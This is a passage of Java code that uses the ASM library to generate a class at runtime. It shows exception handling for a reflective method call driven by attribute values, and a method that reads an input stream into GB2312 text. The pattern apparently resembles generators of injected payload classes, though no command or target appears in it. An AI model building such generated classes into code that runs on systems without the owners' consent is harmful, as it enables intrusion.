            methodVisitor.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[] {"java/lang/NoSuchMethodException"});
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 3);
            Label label38 = new Label();
            methodVisitor.visitLabel(label38);
            methodVisitor.visitLineNumber(94, label38);
            methodVisitor.visitTypeInsn(Opcodes.NEW, "java/lang/Exception");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitTypeInsn(Opcodes.NEW, "java/lang/StringBuilder");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
            methodVisitor.visitLdcInsn("Method invoke failed: ");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 2);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Exception", "<init>", "(Ljava/lang/String;)V", false);
            methodVisitor.visitInsn(Opcodes.ATHROW);
            methodVisitor.visitLabel(label4);
            methodVisitor.visitLineNumber(95, label4);
            methodVisitor.visitFrame(Opcodes.F_SAME1, 0, null, 1, new Object[] {"java/lang/Exception"});
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 3);
            Label label39 = new Label();
            methodVisitor.visitLabel(label39);
            methodVisitor.visitLineNumber(96, label39);
            methodVisitor.visitTypeInsn(Opcodes.NEW, "java/lang/Exception");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitLdcInsn("Unexpected Exception, may be attribute not set properly.");
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Exception", "<init>", "(Ljava/lang/String;)V", false);
            methodVisitor.visitInsn(Opcodes.ATHROW);
            Label label40 = new Label();
            methodVisitor.visitLabel(label40);
            methodVisitor.visitLocalVariable("attr", "Ljava/lang/String;", null, label18, label16, 9);
            methodVisitor.visitLocalVariable("method", "Ljava/lang/reflect/Method;", null, label14, label16, 8);
            methodVisitor.visitLocalVariable("in", "Ljava/io/InputStream;", null, label35, label36, 16);
            methodVisitor.visitLocalVariable("param", "Ljava/lang/String;", null, label31, label36, 15);
            methodVisitor.visitLocalVariable("value", "Ljava/lang/String;", null, label27, label25, 9);
            methodVisitor.visitLocalVariable("invokeMethod", "Ljava/lang/reflect/Method;", null, label28, label25, 10);
            methodVisitor.visitLocalVariable("target", "Ljava/lang/Object;", null, label29, label25, 11);
            methodVisitor.visitLocalVariable("entry", "Ljava/util/Map$Entry;", "Ljava/util/Map$Entry<Ljava/lang/String;Ljava/lang/String;>;", label24, label25, 8);
            methodVisitor.visitLocalVariable("obj", "Ljava/lang/Object;", null, label10, label2, 3);
            methodVisitor.visitLocalVariable("methods", "[Ljava/lang/reflect/Method;", null, label11, label2, 4);
            methodVisitor.visitLocalVariable("superClass", "Ljava/util/List;", "Ljava/util/List<Ljava/lang/Class<*>;>;", label20, label2, 5);
            methodVisitor.visitLocalVariable("sb", "Ljava/lang/StringBuilder;", null, label21, label2, 6);
            methodVisitor.visitLocalVariable("e", "Ljava/lang/ClassNotFoundException;", null, label37, label3, 3);
            methodVisitor.visitLocalVariable("e", "Ljava/lang/NoSuchMethodException;", null, label38, label4, 3);
            methodVisitor.visitLocalVariable("e", "Ljava/lang/Exception;", null, label39, label40, 3);
            methodVisitor.visitLocalVariable("this", "L" + className + ";", null, label5, label40, 0);
            methodVisitor.visitLocalVariable("clazz", "Ljava/lang/Class;", null, label6, label40, 1);
            methodVisitor.visitLocalVariable("methodName", "Ljava/lang/String;", null, label0, label40, 2);
            methodVisitor.visitMaxs(6, 17);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, "getString", "(Ljava/io/InputStream;)Ljava/lang/String;", null, new String[] { "java/io/IOException" });
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(101, label0);
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitVarInsn(Opcodes.ISTORE, 2);
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLineNumber(102, label1);
            methodVisitor.visitIntInsn(Opcodes.SIPUSH, 1024);
            methodVisitor.visitIntInsn(Opcodes.NEWARRAY, Opcodes.T_BYTE);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 3);
            Label label2 = new Label();
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLineNumber(103, label2);
            methodVisitor.visitTypeInsn(Opcodes.NEW, "java/io/ByteArrayOutputStream");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/io/ByteArrayOutputStream", "<init>", "()V", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 4);
            Label label3 = new Label();
            methodVisitor.visitLabel(label3);
            methodVisitor.visitLineNumber(105, label3);
            methodVisitor.visitFrame(Opcodes.F_APPEND,3, new Object[] {Opcodes.INTEGER, "[B", "java/io/ByteArrayOutputStream"}, 0, null);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 3);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/InputStream", "read", "([B)I", false);
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitVarInsn(Opcodes.ISTORE, 2);
            methodVisitor.visitInsn(Opcodes.ICONST_M1);
            Label label4 = new Label();
            methodVisitor.visitJumpInsn(Opcodes.IF_ICMPEQ, label4);
            Label label5 = new Label();
            methodVisitor.visitLabel(label5);
            methodVisitor.visitLineNumber(106, label5);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 4);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 3);
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitVarInsn(Opcodes.ILOAD, 2);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/ByteArrayOutputStream", "write", "([BII)V", false);
            methodVisitor.visitJumpInsn(Opcodes.GOTO, label3);
            methodVisitor.visitLabel(label4);
            methodVisitor.visitLineNumber(109, label4);
            methodVisitor.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 4);
            methodVisitor.visitLdcInsn("GB2312");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/io/ByteArrayOutputStream", "toString", "(Ljava/lang/String;)Ljava/lang/String;", false);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "trim", "()Ljava/lang/String;", false);
            methodVisitor.visitInsn(Opcodes.ARETURN);
            Label label6 = new Label();
            methodVisitor.visitLabel(label6);
            methodVisitor.visitLocalVariable("this", "L" + className + ";", null, label0, label6, 0);
            methodVisitor.visitLocalVariable("in", "Ljava/io/InputStream;", null, label0, label6, 1);
            methodVisitor.visitLocalVariable("len", "I", null, label1, label6, 2);
            methodVisitor.visitLocalVariable("buffer", "[B", null, label2, label6, 3);
            methodVisitor.visitLocalVariable("baos", "Ljava/io/ByteArrayOutputStream;", null, label3, label6, 4);
            methodVisitor.visitMaxs(4, 5);
            methodVisitor.visitEnd();
        }

        // 获取生成的class文件对应的二进制流
        return classWriter.toByteArray();
    }
}
